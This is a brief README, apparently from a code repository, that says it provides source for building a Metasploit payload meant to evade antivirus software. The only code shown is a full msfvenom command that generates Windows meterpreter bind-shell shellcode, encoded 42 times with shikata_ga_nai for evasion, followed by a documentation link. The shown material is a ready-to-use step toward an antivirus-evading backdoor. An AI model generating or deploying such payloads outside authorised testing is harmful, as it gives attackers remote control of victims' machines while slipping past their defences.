## Custome metasploit payload

Provide source for build a metasploit payload to evade av software

### Generate shellcode

Before compiling you need to create a shellcode with msfvenom.

```shell
msfvenom -a x86 --platform Windows -p windows/meterpreter/bind_tcp LPORT=1234 -e x86/shikata_ga_nai -b '\x00' -i 42 -f c
```

## Documentation
[https://www.offensive-security.com/metasploit-unleashed/msfvenom/](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
